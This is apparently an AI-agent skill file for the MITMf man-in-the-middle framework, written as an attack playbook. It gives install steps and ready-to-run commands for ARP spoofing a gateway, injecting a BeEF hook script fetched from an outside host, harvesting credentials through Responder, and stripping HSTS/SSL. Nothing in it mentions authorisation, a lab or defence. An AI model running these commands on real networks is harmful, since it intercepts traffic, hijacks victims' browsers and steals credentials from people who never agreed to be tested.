---
name: mitmf-mitm
description: "MITMf: ARP spoofing plus JS injection and credential harvesting. Signals: man-in-the-middle, MITM, SSL downgrade, integrated Responder."
zh-signals: "MITMf: ARP 欺骗+JS 注入、欺骗+凭据收割。信号:中间人,mitm,SSL 降级,集成 Responder。"
when-to-use: >-
  Use when performing man-in-the-middle attacks on a local network, such as ARP
  spoofing with JavaScript injection, credential harvesting, or SSL stripping;
  run it on the attacker host with forwarding enabled.
---

# MITMf

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/byt3bl33d3r/MITMf
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/byt3bl33d3r/MITMf && cd MITMf && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python mitmf.py -i eth0 --spoof --arp --gateway 10.0.0.1` | ARP spoofing |
| `--hsts` | SSL downgrade |
| `--inject --js-url http://x.com/hook.js` | JS injection |
| `--responder` | Integrated Responder |
| `--log` | See the upstream documentation |
| `logging` | See the upstream documentation |

## Attack Scenario Playbook

### ARP spoofing plus JS injection

```bash
python mitmf.py -i eth0 --spoof --arp --gateway 10.0.0.1 --inject --js-url http://10.8.0.2:3000/hook.js
# All target traffic passes through the attacker machine, and the BeEF hook is injected automatically
```

### Spoofing plus credential harvesting

```bash
python mitmf.py --spoof --arp --gateway 10.0.0.1 --responder --hsts
```

## Notes

A modular MITM framework; pairing JS injection with BeEF turns XSS into a passive technique.
